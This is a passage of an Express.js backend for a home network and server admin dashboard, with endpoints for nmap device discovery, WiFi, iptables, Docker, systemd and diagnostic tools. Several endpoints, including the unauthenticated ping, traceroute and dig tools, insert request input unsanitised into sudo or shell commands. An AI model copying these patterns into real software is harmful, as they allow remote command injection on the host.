    if (h.includes('sonos') || vendor === 'Sonos') return { type: 'Smart Speaker', vendor, icon: '🔊' };
    if (h.includes('ecobee') || vendor === 'Ecobee') return { type: 'Smart Thermostat', vendor, icon: '🌡️' };
    if (h.includes('august') || vendor === 'August') return { type: 'Smart Lock', vendor, icon: '🔒' };
    if (h.includes('yale') || vendor === 'Yale') return { type: 'Smart Lock', vendor, icon: '🔒' };
    if (h.includes('smartthings') || vendor === 'SmartThings') return { type: 'Smart Hub', vendor, icon: '🏠' };
    if (h.includes('hue') || vendor === 'Philips Hue') return { type: 'Smart Light', vendor, icon: '💡' };
    if (h.includes('plug') || h.includes('outlet') || vendor === 'Smart Plug') return { type: 'Smart Plug', icon: '🔌' };
    if (vendor === 'Amazon' && (h.includes('fire') || h.includes('stick'))) return { type: 'Streaming', vendor, icon: '📺' };
    
    // Phone detection
    if (vendor === 'Apple' && (h.includes('iphone') || h.includes('ipad') || h.includes('ios'))) return { type: 'Mobile', vendor, icon: '📱' };
    if (vendor === 'Samsung' && (h.includes('galaxy') || h.includes('samsung'))) return { type: 'Mobile', vendor, icon: '📱' };
    if (vendor === 'Google' && (h.includes('pixel') || h.includes('android'))) return { type: 'Mobile', vendor, icon: '📱' };
    if (vendor === 'Apple' || vendor === 'Samsung' || vendor === 'Google') return { type: 'Mobile', vendor, icon: '📱' };
    
    // Computer detection
    if (vendor === 'Apple' && (h.includes('mac') || h.includes('imac') || h.includes('macbook'))) return { type: 'Computer', vendor, icon: '💻' };
    if (vendor === 'Dell' || vendor === 'HP' || vendor === 'Lenovo' || vendor === 'ASUS' || vendor === 'Acer') return { type: 'Computer', vendor, icon: '🖥️' };
    if (vendor === 'Microsoft' && h.includes('surface')) return { type: 'Computer', vendor, icon: '💻' };
    if (h.includes('desktop') || h.includes('pc') || h.includes('workstation')) return { type: 'Computer', vendor, icon: '🖥️' };
    if (h.includes('macbook') || h.includes('laptop') || h.includes('notebook')) return { type: 'Laptop', vendor, icon: '💻' };
    if (vendor === 'Intel' && h.includes('nuc')) return { type: 'Computer', vendor, icon: '🖥️' };
    if (vendor === 'Raspberry Pi') return { type: 'Single Board Computer', vendor, icon: '🔸' };
    if (vendor === 'NVIDIA') return { type: 'Gaming PC', vendor, icon: '🎮' };
    
    // Gaming
    if (vendor === 'Sony' || vendor === 'PlayStation') return { type: 'Gaming Console', vendor, icon: '🎮' };
    if (vendor === 'Microsoft' && (h.includes('xbox') || h.includes('game'))) return { type: 'Gaming Console', vendor, icon: '🎮' };
    if (vendor === 'Nintendo') return { type: 'Gaming Console', vendor, icon: '🎮' };
    
    // Smart TV
    if (vendor.includes('TV') || h.includes('tv') || h.includes('living room') || h.includes('bedroom')) return { type: 'Smart TV', vendor, icon: '📺' };
    if (vendor === 'Samsung TV' || vendor === 'LG TV' || vendor === 'Sony TV' || vendor === 'Vizio TV') return { type: 'Smart TV', vendor, icon: '📺' };
    
    // Network设备
    if (vendor === 'Cisco' || vendor === 'NETGEAR' || vendor === 'TP-Link' || vendor === 'Ubiquiti') return { type: 'Network Device', vendor, icon: '📡' };
    if (h.includes('router') || h.includes('gateway') || h.includes('modem')) return { type: 'Router', vendor, icon: '📡' };
    if (h.includes('access') || h.includes('ap-')) return { type: 'Access Point', vendor, icon: '📶' };
    
    // Printer
    if (h.includes('printer') || h.includes('print') || vendor === 'HP' || vendor === 'Canon' || vendor === 'Epson') return { type: 'Printer', vendor, icon: '🖨️' };
    
    // Default based on vendor
    if (vendor !== 'Unknown') {
        return { type: 'IoT Device', vendor, icon: '📟' };
    }
    
    return { type: 'Unknown', vendor: 'Unknown', icon: '❓' };
}

// Devices
function isPrivateIP(ip) {
    const parts = ip.split('.').map(Number);
    if (parts.length !== 4 || parts.some(p => isNaN(p) || p < 0 || p > 255)) return true;
    if (parts[0] === 10) return true;
    if (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) return true;
    if (parts[0] === 192 && parts[1] === 168) return true;
    if (parts[0] === 127) return true;
    return false;
}

async function fetchGeoIP(ip) {
    try {
        const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,city`, { signal: AbortSignal.timeout(5000) });
        const j = await r.json();
        if (j.status === 'success') return { country: j.country, countryCode: j.countryCode, city: j.city };
    } catch (_) {}
    return null;
}

let dCache = [], dCacheT = 0;
app.get('/api/devices', async (req, res) => {
    try {
        const enrichGeo = req.query.enrich === 'geo';
        const now = Date.now();
        let devs;
        if (now - dCacheT < 30000 && dCache.length > 0) {
            devs = [...dCache];
        } else {
            let raw = [];
            try {
                const subnet = await getScanSubnet();
                const o = await run(`sudo nmap -sn ${subnet} -oX - 2>/dev/null`, 30000);
                const hostBlocks = o.split(/<host[ >]/).slice(1);
                for (const blk of hostBlocks) {
                    const ip = (blk.match(/addrtype="ipv4"\s+addr="(\d+\.\d+\.\d+\.\d+)"/) || blk.match(/addr="(\d+\.\d+\.\d+\.\d+)"\s+addrtype="ipv4"/) || blk.match(/addr="(\d+\.\d+\.\d+\.\d+)"/) || [])[1];
                    if (!ip) continue;
                    const mac = (blk.match(/addrtype="mac"\s+addr="([^"]+)"/) || blk.match(/addr="([0-9A-Fa-f:]{17})"\s+addrtype="mac"/) || [])[1] || '';
                    const vendor = (blk.match(/vendor="([^"]+)"/) || [])[1] || '';
                    const hn = (blk.match(/name="([^"]+)"\s+type="PTR"/) || blk.match(/hostname="([^"]+)"/) || [])[1] || '';
                    raw.push({ ip, hostname: hn || vendor || 'Unknown', mac: mac.toLowerCase(), status: 'Up', vendor: vendor });
                }
            } catch (e) {
                const o = await run('ip neighbor show 2>/dev/null||arp -a');
                for (const l of o.split('\n')) {
                    const m = l.match(/^(\d+\.\d+\.\d+\.\d+)\s+dev\s+\S+\s+lladdr\s+(\S+)\s+(\S+)/);
                    if (m) raw.push({ ip: m[1], hostname: 'Unknown', mac: m[2], status: m[3] });
                }
            }
            try {
                const a = await run('arp -a 2>/dev/null');
                const mm = {};
                for (const l of a.split('\n')) {
                    const m = l.match(/\((\d+\.\d+\.\d+\.\d+)\)\s+at\s+([0-9a-f:]+)/i);
                    if (m) mm[m[1]] = m[2];
                }
                for (const d of raw) if (!d.mac && mm[d.ip]) d.mac = mm[d.ip];
            } catch (e) {}
            raw.sort((a, b) => { const ap = a.ip.split('.').map(Number), bp = b.ip.split('.').map(Number); for (let i = 0; i < 4; i++) if (ap[i] !== bp[i]) return ap[i] - bp[i]; return 0; });
            const seen = new Set();
            raw = raw.filter(d => { if (seen.has(d.ip)) return false; seen.add(d.ip); return true; });
            devs = raw.map(d => {
                const info = getDeviceInfo(d.mac, d.hostname);
                return { ...d, type: info.type, vendor: info.vendor, icon: info.icon };
            });
            dCache = devs;
            dCacheT = now;
        }
        if (enrichGeo) {
            const toEnrich = devs.filter(d => !isPrivateIP(d.ip)).slice(0, 30);
            for (let i = 0; i < toEnrich.length; i++) {
                const geo = await fetchGeoIP(toEnrich[i].ip);
                if (geo) Object.assign(toEnrich[i], geo);
                if (i < toEnrich.length - 1) await new Promise(r => setTimeout(r, 1500));
            }
        }
        res.json(devs);
    } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/devices/scan', requireAuth, (_, res) => { dCacheT = 0; res.json({ success: true }); });

// WiFi
app.get('/api/wifi', async (req, res) => {
    try {
        const wiface = await getWirelessIface();
        const [iw, nm] = await Promise.all([
            run(wiface ? `iwconfig ${wiface} 2>/dev/null||echo ""` : 'echo ""'),
            run('nmcli -t -f SSID,SIGNAL,SECURITY,FREQ,CHAN device wifi list 2>/dev/null||echo ""')
        ]);
        const connected = { 
            ssid: iw.match(/ESSID:"([^"]+)"/)?.[1] || 'N/A', 
            frequency: iw.match(/Frequency:([\d.]+\s*GHz)/)?.[1] || '', 
            bitrate: iw.match(/Bit Rate=([\d.]+\s*\w+)/)?.[1] || '', 
            linkQuality: iw.match(/Link Quality=(\d+\/\d+)/)?.[1] || '', 
            signalLevel: iw.match(/Signal level=(-?\d+\s*dBm)/)?.[1] || '', 
            mode: iw.match(/Mode:(\S+)/)?.[1] || '' 
        };
        const nearby = []; 
        for (const l of nm.split('\n').filter(l => l.trim())) { 
            const p = l.split(':'); 
            if (p.length >= 4) nearby.push({ ssid: p[0], signal: p[1] + '%', security: p[2], freq: p[3], channel: p[4] || '' }); 
        }
        res.json({ connected, nearby: nearby.slice(0, 25) });
    } catch (e) { res.status(500).json({ error: e.message }) }
});

app.post('/api/wifi/connect', requireAuth, async (req, res) => {
    const { ssid, password } = req.body; 
    if (!ssid) return res.status(400).json({ error: 'No SSID' });
    try { 
        const o = await run(`nmcli device wifi connect "${ssid}" password "${password || ''}" 2>&1`); 
        res.json({ success: true, output: o }); 
    } catch (e) { res.json({ success: false, output: e.message }) }
});

app.post('/api/wifi/disconnect', requireAuth, async (_, res) => { 
    try {
        const wiface = await getWirelessIface();
        if (!wiface) return res.json({ success: false, error: 'No wireless interface' });
        await run(`nmcli device disconnect ${wiface} 2>&1`);
        res.json({ success: true });
    } catch (e) { res.json({ success: false, error: e.message }); }
});

// DNS/DHCP
app.get('/api/dns', async (_, res) => { 
    try { 
        const r = await run('cat /etc/resolv.conf 2>/dev/null'); 
        const s = []; 
        for (const l of r.split('\n')) { 
            const m = l.match(/^nameserver\s+([\d.]+)/); 
            if (m) s.push(m[1]); 
        } 
        const sys = await run('resolvectl status 2>/dev/null|head -30||echo ""'); 
        res.json({ servers: s, systemd: sys }); 
    } catch (e) { res.status(500).json({ error: e.message }) } 
});

app.get('/api/dhcp', async (_, res) => { 
    try { 
        const iface = await getPrimaryIface();
        const o = await run(iface ? `nmcli device show ${iface} 2>/dev/null|grep -E "IP4\\.(ADDRESS|GATEWAY|DNS|DOMAIN)"|head -10||echo ""` : 'echo ""');
        res.json({ info: o }); 
    } catch (e) { res.status(500).json({ error: e.message }) } 
});

// Ports
const KP = { 22: 'SSH', 25: 'SMTP', 53: 'DNS', 80: 'HTTP', 443: 'HTTPS', 139: 'NetBIOS', 445: 'SMB', 631: 'CUPS', 3000: 'Net Admin', 5432: 'PostgreSQL', 8080: 'HTTP-Alt', 25565: 'Minecraft', 24454: 'VoiceChat' };
let _svcMapCache = null, _svcMapT = 0;
async function getPortServiceMap() {
    if (_svcMapCache && Date.now() - _svcMapT < 60000) return _svcMapCache;
    try {
        const o = await run('getent services 2>/dev/null || grep -v "^#" /etc/services 2>/dev/null | head -2000');
        const m = {};
        for (const l of (o || '').split('\n')) {
            const parts = l.trim().split(/\s+/);
            if (parts.length >= 2) {
                const last = parts[parts.length - 1];
                const match = last.match(/^(\d+)\/(tcp|udp)/);
                if (match) m[match[1] + '/' + match[2]] = parts[0];
            }
        }
        _svcMapCache = m; _svcMapT = Date.now(); return m;
    } catch (_) { return {}; }
}
function portService(port, proto, svcMap) {
    return KP[port] || (svcMap && (svcMap[port + '/tcp'] || svcMap[port + '/udp'])) || '';
}
app.get('/api/ports', async (_, res) => { 
    try { 
        const [o, svcMap] = await Promise.all([run('sudo ss -tlnp 2>/dev/null||ss -tlnp'), getPortServiceMap()]);
        const ports = []; 
        for (const l of o.split('\n').slice(1)) { 
            const p = l.trim().split(/\s+/); 
            if (p.length < 5) continue; 
            const lo = p[3], lc = lo.lastIndexOf(':'), port = parseInt(lo.substring(lc + 1)); 
            const pm = l.match(/users:\(\("([^"]+)",pid=(\d+)/); 
            ports.push({ address: lo.substring(0, lc), port, process: pm?.[1] || 'system', pid: pm?.[2] || '', service: portService(port, 'tcp', svcMap) });
        } 
        ports.sort((a, b) => a.port - b.port); 
        res.json(ports); 
    } catch (e) { res.status(500).json({ error: e.message }) } 
});

// Connections
app.get('/api/connections', async (_, res) => { 
    try { 
        const o = await run('sudo ss -tnp 2>/dev/null||ss -tnp'); 
        const c = []; 
        for (const l of o.split('\n').slice(1)) { 
            const p = l.trim().split(/\s+/); 
            if (p.length < 5) continue; 
            const pm = l.match(/users:\(\("([^"]+)",pid=(\d+)/); 
            c.push({ state: p[0], local: p[3], remote: p[4], process: pm?.[1] || 'system' }); 
        } 
        res.json(c); 
    } catch (e) { res.status(500).json({ error: e.message }) } 
});

// Firewall (local) — iptables or UFW fallback
app.get('/api/firewall', async (_, res) => { 
    try { 
        let o = await run('sudo iptables -L INPUT -n --line-numbers 2>/dev/null||echo ""'); 
        const r = []; 
        for (const l of o.split('\n').slice(2)) { 
            const p = l.trim().split(/\s+/); 
            if (p.length >= 5) r.push({ num: p[0], target: p[1], protocol: p[2], source: p[4], destination: p[5] || '*', extra: p.slice(6).join(' ') }); 
        } 
        if (r.length === 0) {
            const ufw = await run('sudo ufw status numbered 2>/dev/null||echo ""');
            for (const l of ufw.split('\n')) {
                const m = l.match(/^\[\s*(\d+)\]\s+(\S+)\s+(\S+)\s+(.*)/);
                if (m) r.push({ num: m[1], target: m[2], protocol: m[3], source: m[4] || '*', destination: '*', extra: '' });
            }
        }
        res.json(r); 
    } catch (e) { res.status(500).json({ error: e.message }) } 
});

app.post('/api/firewall/block-ip', requireAuth, async (req, res) => {
    const { ip } = req.body;
    if (!ip) return res.status(400).json({ error: 'No IP' });
    if (!validateIP(ip)) return res.status(400).json({ error: 'Invalid IP address' });
    try { await run(`sudo iptables -I INPUT -s ${ip} -j DROP`); res.json({ success: true }); }
    catch (e) { res.status(500).json({ error: e.message }) }
});

app.post('/api/firewall/unblock-ip', requireAuth, async (req, res) => {
    const { ip } = req.body;
    if (!ip) return res.status(400).json({ error: 'No IP' });
    if (!validateIP(ip)) return res.status(400).json({ error: 'Invalid IP address' });
    try { await run(`sudo iptables -D INPUT -s ${ip} -j DROP`); res.json({ success: true }); }
    catch (e) { res.status(500).json({ error: e.message }) }
});

app.post('/api/firewall/open-port', requireAuth, async (req, res) => {
    const { port, protocol = 'tcp' } = req.body;
    if (!validatePort(port)) return res.status(400).json({ error: 'Invalid port' });
    if (!validateProtocol(protocol)) return res.status(400).json({ error: 'Invalid protocol' });
    try { await run(`sudo iptables -I INPUT -p ${protocol} --dport ${parseInt(port,10)} -j ACCEPT`); res.json({ success: true }); }
    catch (e) { res.status(500).json({ error: e.message }) }
});

app.post('/api/firewall/close-port', requireAuth, async (req, res) => {
    const { port, protocol = 'tcp' } = req.body;
    if (!validatePort(port)) return res.status(400).json({ error: 'Invalid port' });
    if (!validateProtocol(protocol)) return res.status(400).json({ error: 'Invalid protocol' });
    try { await run(`sudo iptables -I INPUT -p ${protocol} --dport ${parseInt(port,10)} -j DROP`); res.json({ success: true }); }
    catch (e) { res.status(500).json({ error: e.message }) }
});

app.post('/api/firewall/delete-rule', requireAuth, async (req, res) => {
    const { ruleNum } = req.body;
    if (!validateRuleNum(ruleNum)) return res.status(400).json({ error: 'Invalid rule number' });
    try { await run(`sudo iptables -D INPUT ${parseInt(ruleNum,10)}`); res.json({ success: true }); }
    catch (e) { res.status(500).json({ error: e.message }) }
});

// Port Forwarding (local)
app.get('/api/portforward', async (_, res) => {
    try {
        const o = await run('sudo iptables -t nat -L PREROUTING -n -v --line-numbers 2>/dev/null||echo ""');
        const rules = [];
        for (const l of o.split('\n').slice(2)) {
            const m = l.match(/^\s*(\d+).*DNAT\s+(tcp|udp).*dpt:(\d+)\s+to:([\d.]+):(\d+)/);
            if (m) rules.push({ num: m[1], protocol: m[2], extPort: m[3], intIp: m[4], intPort: m[5] });
        }
        res.json(rules);
    } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/portforward', requireAuth, async (req, res) => {
    const { extPort, intIp, intPort, protocol = 'tcp' } = req.body;
    const port = parseInt(extPort, 10);
    const intP = parseInt(intPort, 10);
    if (!port || port < 1 || port > 65535 || !intP || intP < 1 || intP > 65535) return res.status(400).json({ error: 'Invalid ports' });
    if (!/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(intIp)) return res.status(400).json({ error: 'Invalid internal IP' });
    const prot = protocol === 'udp' ? 'udp' : 'tcp';
    try {
        await run(`sudo iptables -t nat -A PREROUTING -p ${prot} --dport ${port} -j DNAT --to-destination ${intIp}:${intP}`);
        await run(`sudo iptables -A FORWARD -p ${prot} -d ${intIp} --dport ${intP} -j ACCEPT 2>/dev/null||true`);
        res.json({ success: true });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

app.delete('/api/portforward/:num', requireAuth, async (req, res) => {
    const num = req.params.num.replace(/\D/g, '');
    if (!num) return res.status(400).json({ error: 'Invalid rule number' });
    try {
        await run(`sudo iptables -t nat -D PREROUTING ${num}`);
        res.json({ success: true });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

// Router dashboard — ports, connections, portforward, firewall, gateway, dns, arp
app.get('/api/router/dashboard', async (_, res) => {
    try {
        const [tcpP, udpP, tcpC, udpC, pfRaw, fwRaw, gw, dnsRaw, arpRaw, svcMap] = await Promise.all([
            run('sudo ss -tlnp 2>/dev/null||ss -tlnp'),
            run('sudo ss -ulnp 2>/dev/null||ss -ulnp'),
            run('sudo ss -tnp 2>/dev/null||ss -tnp'),
            run('sudo ss -unp 2>/dev/null||ss -unp'),
            run('sudo iptables -t nat -L PREROUTING -n -v --line-numbers 2>/dev/null||echo ""'),
            run('sudo iptables -L INPUT -n --line-numbers 2>/dev/null||echo ""'),
            run('ip route | grep default | head -1'),
            run('cat /etc/resolv.conf 2>/dev/null | grep nameserver | awk \'{print $2}\' | head -4'),
            run('ip neigh show 2>/dev/null | grep -v FAILED'),
            getPortServiceMap()
        ]);
        const ports = [], conns = [];
        const parsePorts = (o, proto) => {
            for (const l of (o || '').split('\n').slice(1)) {
                const p = l.trim().split(/\s+/);
                if (p.length < 5) continue;
                const lo = p[3], lc = lo.lastIndexOf(':'), port = parseInt(lo.substring(lc + 1));
                if (isNaN(port) || port < 1) continue;
                const pm = l.match(/users:\(\("([^"]+)",pid=(\d+)/);
            ports.push({ address: lo.substring(0, lc), port, process: pm?.[1] || 'system', pid: pm?.[2] || '', service: portService(port, proto, svcMap) });
            }
        };
        const parseConns = (o, proto) => {
            for (const l of (o || '').split('\n').slice(1)) {
                const p = l.trim().split(/\s+/);
                if (p.length < 5) continue;
                const pm = l.match(/users:\(\("([^"]+)",pid=(\d+)/);
                conns.push({ state: p[0], local: p[3], remote: p[4], process: pm?.[1] || 'system', proto });
            }
        };
        parsePorts(tcpP, 'tcp'); parsePorts(udpP, 'udp');
        parseConns(tcpC, 'tcp'); parseConns(udpC, 'udp');
        ports.sort((a, b) => a.port - b.port);
        const pf = [];
        for (const l of (pfRaw || '').split('\n').slice(2)) {
            const m = l.match(/^\s*(\d+).*DNAT\s+(tcp|udp).*dpt:(\d+)\s+to:([\d.]+):(\d+)/);
            if (m) pf.push({ num: m[1], protocol: m[2], extPort: m[3], intIp: m[4], intPort: m[5] });
        }
        const fw = [];
        for (const l of (fwRaw || '').split('\n').slice(2)) {
            const p = l.trim().split(/\s+/);
            if (p.length >= 5) fw.push({ num: p[0], target: p[1], protocol: p[2], source: p[4], destination: p[5] || '*' });
        }
        if (fw.length === 0) {
            const ufw = await run('sudo ufw status numbered 2>/dev/null||echo ""');
            for (const l of ufw.split('\n')) {
                const m = l.match(/^\[\s*(\d+)\]\s+(\S+)\s+(\S+)\s+(.*)/);
                if (m) fw.push({ num: m[1], target: m[2], protocol: m[3], source: m[4] || '*', destination: '*' });
            }
        }
        const dns = (dnsRaw || '').trim().split('\n').filter(Boolean);
        const arp = (arpRaw || '').split('\n').filter(Boolean).map(l => {
            const p = l.split(/\s+/);
            return { ip: p[0], mac: p[4] || '', state: p[5] || '' };
        });
        const gateway = (gw || '').trim().split(/\s+/)[2] || 'N/A';
        res.json({ ports, connections: conns, portForward: pf, firewall: fw, gateway, dns, arp });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

// Bandwidth
app.get('/api/bandwidth', (_, res) => { 
    try { 
        const now = Date.now(), curr = readDev(), el = (now - prevBwT) / 1000, r = {}; 
        for (const [n, s] of Object.entries(curr)) { 
            const p = prevBw[n]; 
            let rxR = 0, txR = 0; 
            if (p && el > 0 && el < 60) { rxR = Math.max(0, (s.rx - p.rx) / el); txR = Math.max(0, (s.tx - p.tx) / el); } 
            r[n] = { rxTotal: fmt(s.rx), txTotal: fmt(s.tx), rxRate: fmtR(rxR), txRate: fmtR(txR), rxRaw: rxR, txRaw: txR }; 
        } 
        prevBw = curr; prevBwT = now; res.json(r); 
    } catch (e) { res.status(500).json({ error: e.message }) } 
});

// Processes
app.get('/api/processes', async (_, res) => { 
    try { 
        const o = await run('ps aux --sort=-%cpu|head -30'); 
        const p = []; 
        for (const l of o.split('\n').slice(1)) { 
            const x = l.trim().split(/\s+/); 
            if (x.length < 11) continue; 
            p.push({ user: x[0], pid: x[1], cpu: x[2], mem: x[3], rss: x[5], command: x.slice(10).join(' ').substring(0, 100) }); 
        } 
        res.json(p); 
    } catch (e) { res.status(500).json({ error: e.message }) } 
});

app.post('/api/processes/kill', requireAuth, async (req, res) => { 
    const { pid, signal = 'TERM' } = req.body; 
    if (!pid) return res.status(400).json({ error: 'No PID' }); 
    try { await run(`kill -${signal} ${pid}`); res.json({ success: true }); } 
    catch (e) { res.status(500).json({ error: e.message }) } 
});

// Temperatures
app.get('/api/temperatures', async (_, res) => { 
    try { 
        const o = await run('sensors 2>/dev/null||echo ""'); 
        const t = []; 
        for (const l of o.split('\n')) { 
            const m = l.match(/^(.+?):\s+\+?([\d.]+)°C/); 
            if (m) t.push({ label: m[1].trim(), temp: parseFloat(m[2]) }); 
        } 
        try { 
            const g = await run('nvidia-smi --query-gpu=temperature.gpu --format=csv,noheader 2>/dev/null'); 
            if (g) t.push({ label: 'GPU', temp: parseFloat(g) }); 
        } catch (e) { } 
        res.json(t); 
    } catch (e) { res.status(500).json({ error: e.message }) } 
});

// Disk
app.get('/api/disk', async (_, res) => { 
    try { 
        const o = await run('df -h --output=source,fstype,size,used,avail,pcent,target 2>/dev/null|grep -v tmpfs|grep -v udev'); 
        const d = []; 
        for (const l of o.split('\n').slice(1)) { 
            const p = l.trim().split(/\s+/); 
            if (p.length >= 7) d.push({ device: p[0], fstype: p[1], size: p[2], used: p[3], avail: p[4], pct: p[5], mount: p[6] }); 
        } 
        res.json(d); 
    } catch (e) { res.status(500).json({ error: e.message }) } 
});

// USB
app.get('/api/usb', async (_, res) => { 
    try { 
        const o = await run('lsusb 2>/dev/null||echo ""'); 
        const d = []; 
        for (const l of o.split('\n').filter(l => l.trim())) { 
            const m = l.match(/Bus\s+(\d+)\s+Device\s+(\d+):\s+ID\s+(\S+)\s+(.*)/); 
            if (m) d.push({ bus: m[1], device: m[2], id: m[3], name: m[4] }); 
        } 
        res.json(d); 
    } catch (e) { res.status(500).json({ error: e.message }) } 
});

// Services
app.get('/api/services', async (_, res) => { 
    try { 
        const o = await run('systemctl list-units --type=service --no-pager --no-legend 2>/dev/null|head -50'); 
        const s = []; 
        for (const l of o.split('\n').filter(l => l.trim())) { 
            const p = l.trim().split(/\s+/); 
            if (p.length >= 5) s.push({ name: p[0], load: p[1], active: p[2], sub: p[3], description: p.slice(4).join(' ') }); 
        } 
        res.json(s); 
    } catch (e) { res.status(500).json({ error: e.message }) } 
});

app.post('/api/services/action', requireAuth, async (req, res) => { 
    const { name, action } = req.body; 
    if (!name || !['start', 'stop', 'restart', 'enable', 'disable'].includes(action)) return res.status(400).json({ error: 'Invalid' }); 
    try { 
        const o = await run(`sudo systemctl ${action} ${name} 2>&1`); 
        res.json({ success: true, output: o }); 
    } catch (e) { res.json({ success: false, output: e.message }) } 
});

// Docker
app.get('/api/docker', async (_, res) => { 
    try { 
        const c = await run('docker ps -a --format "{{.ID}}|{{.Image}}|{{.Status}}|{{.Ports}}|{{.Names}}" 2>/dev/null||echo ""'); 
        const containers = []; 
        for (const l of c.split('\n').filter(l => l.trim())) { 
            const p = l.split('|'); 
            if (p.length >= 5) containers.push({ id: p[0], image: p[1], status: p[2], ports: p[3], name: p[4] }); 
        } 
        const i = await run('docker images --format "{{.Repository}}:{{.Tag}}|{{.Size}}|{{.CreatedSince}}" 2>/dev/null||echo ""'); 
        const images = []; 
        for (const l of i.split('\n').filter(l => l.trim())) { 
            const p = l.split('|'); 
            if (p.length >= 2) images.push({ name: p[0], size: p[1], created: p[2] || '' }); 
        } 
        res.json({ containers, images }); 
    } catch (e) { res.status(500).json({ error: e.message }) } 
});

app.post('/api/docker/action', requireAuth, async (req, res) => { 
    const { name, action } = req.body; 
    if (!name || !['start', 'stop', 'restart', 'pause', 'unpause', 'rm'].includes(action)) return res.status(400).json({ error: 'Invalid' }); 
    try { 
        const o = await run(`docker ${action} ${name} 2>&1`); 
        res.json({ success: true, output: o }); 
    } catch (e) { res.json({ success: false, output: e.message }) } 
});

app.get('/api/docker/logs/:name', async (req, res) => { 
    try { 
        const o = await run(`docker logs --tail 50 ${req.params.name} 2>&1`); 
        res.json({ logs: o }); 
    } catch (e) { res.status(500).json({ error: e.message }) } 
});

// Tailscale
app.get('/api/tailscale', async (_, res) => { 
    try { 
        const [st, ip] = await Promise.all([
            run('tailscale status 2>/dev/null||echo ""'), 
            run('tailscale ip 2>/dev/null||echo ""')
        ]); 
        const peers = []; 
        for (const l of st.split('\n').filter(l => l.trim())) { 
            const p = l.trim().split(/\s+/); 
            if (p.length >= 4 && /^\d/.test(p[0])) peers.push({ ip: p[0], hostname: p[1], os: p[2], status: p.slice(3).join(' ') }); 
        } 
        res.json({ ips: ip.split('\n'), peers }); 
    } catch (e) { res.status(500).json({ error: e.message }) } 
});

// ═══════════ OPERATIONAL SECURITY (Track 5) ═══════════
app.get('/api/security/vpn-status', async (_, res) => {
    try {
        const [interfacesOut, wgServices, wgShow, tailscaleOut] = await Promise.all([
            run('ip a 2>/dev/null | grep -E "wg|tun|tap" || echo ""'),
            run('systemctl list-units --type=service --state=active 2>/dev/null | grep -E "wg-quick|wireguard" || echo ""'),
            run('wg show 2>/dev/null || echo ""'),
            run('tailscale status 2>/dev/null || echo ""')
        ]);
        const interfaces = interfacesOut.split('\n').filter(l => l.trim()).map(l => l.trim());
        const wireguard = wgServices.trim().length > 0 || wgShow.trim().length > 0;
        const openvpn = interfaces.some(i => /tun|tap/.test(i));
        const tailscale = tailscaleOut.includes('Connected') || tailscaleOut.includes('logged in');
        res.json({ wireguard, openvpn, tailscale, interfaces });
    } catch (e) {
        res.status(500).json({ error: e.message, wireguard: false, openvpn: false, tailscale: false, interfaces: [] });
    }
});

app.get('/api/security/tor-status', async (_, res) => {
    try {
        const out = await run('curl -s --connect-timeout 5 --max-time 10 --socks5-hostname 127.0.0.1:9050 https://check.torproject.org/api/ip 2>/dev/null || echo ""');
        const ok = out.includes('"IsTor":true') || (out.includes('IsTor') && out.includes('true'));
        let ip = null;
        try {
            const j = JSON.parse(out);
            if (j.IP) ip = j.IP;
        } catch (_) {}
        res.json({ connected: ok, exitIp: ip });
    } catch (e) {
        res.json({ connected: false, exitIp: null });
    }
});

// Minecraft
app.get('/api/minecraft', async (_, res) => {
    try {
        const jp = await run('ps aux|grep "fabric-server"|grep -v grep||echo ""'); 
        const running = jp.includes('fabric-server'); 
        let players = [], port = 25565, version = '', motd = '', mem = '', up = '';
        try { 
            const pr = fs.readFileSync(path.join(MC_DIR, 'server.properties'), 'utf8'); 
            port = parseInt(pr.match(/server-port=(\d+)/)?.[1] || '25565'); 
            motd = pr.match(/motd=(.*)/)?.[1] || ''; 
        } catch (e) { }
        if (running) {
            try { 
                const pid = jp.match(/\S+\s+(\d+)/)?.[1]; 
                if (pid) { 
                    const mi = await run(`ps -p ${pid} -o rss=,etime=`); 
                    const pp = mi.trim().split(/\s+/); 
                    mem = (parseInt(pp[0]) / 1024).toFixed(0) + ' MB'; 
                    up = pp[1] || ''; 
                } 
            } catch (e) { }
            try { 
                const log = fs.readFileSync(path.join(MC_DIR, 'logs', 'latest.log'), 'utf8'); 
                const jm = {}; 
                for (const l of log.split('\n')) { 
                    const j = l.match(/(\w+) joined the game/); 
                    const lv = l.match(/(\w+) left the game/); 
                    if (j) jm[j[1]] = true; 
                    if (lv) delete jm[lv[1]]; 
                } 
                players = Object.keys(jm); 
                version = log.match(/Starting minecraft server version ([\d.]+)/)?.[1] || ''; 
                const pk = log.match(/Loaded (\d+) Pokémon species/)?.[1]; 
                if (pk) version += ` | ${pk} Pokémon`; 
            } catch (e) { }
        }
        res.json({ running, port, players, playerCount: players.length, version, motd, mem, uptime: up });
    } catch (e) { res.status(500).json({ error: e.message }) }
});

// Logs
app.get('/api/logs', async (req, res) => {
    const type = req.query.type || 'syslog', n = parseInt(req.query.lines) || 50;
    const files = { syslog: '/var/log/syslog', auth: '/var/log/auth.log', kernel: '/var/log/kern.log', minecraft: path.join(MC_DIR, 'logs', 'latest.log') };
    try { 
        let o; 
        if (type === 'journal') o = await run(`journalctl -n ${n} --no-pager 2>/dev/null`); 
        else { 
            const f = files[type]; 
            if (!f) return res.status(400).json({ error: 'Invalid type' }); 
            o = await run(`sudo tail -n ${n} "${f}" 2>/dev/null||tail -n ${n} "${f}" 2>/dev/null||echo "Cannot read"`); 
        } 
        res.json({ lines: o.split('\n') }); 
    } catch (e) { res.status(500).json({ error: e.message }) }
});

// Tools
app.post('/api/tools/ping', async (req, res) => { 
    const { host } = req.body; 
    try { res.json({ output: await run(`ping -c 4 -W 3 "${host}" 2>&1`) }); } 
    catch (e) { res.json({ output: e.message }) } 
});

app.post('/api/tools/traceroute', async (req, res) => { 
    const { host } = req.body; 
    try { res.json({ output: await run(`traceroute -m 15 -w 2 "${host}" 2>&1`) }); } 
    catch (e) { res.json({ output: e.message }) } 
});

app.post('/api/tools/dns', async (req, res) => { 
    const { host } = req.body; 
    try { res.json({ output: await run(`dig "${host}" +noall +answer 2>&1||nslookup "${host}" 2>&1`) }); } 
    catch (e) { res.json({ output: e.message }) } 
});

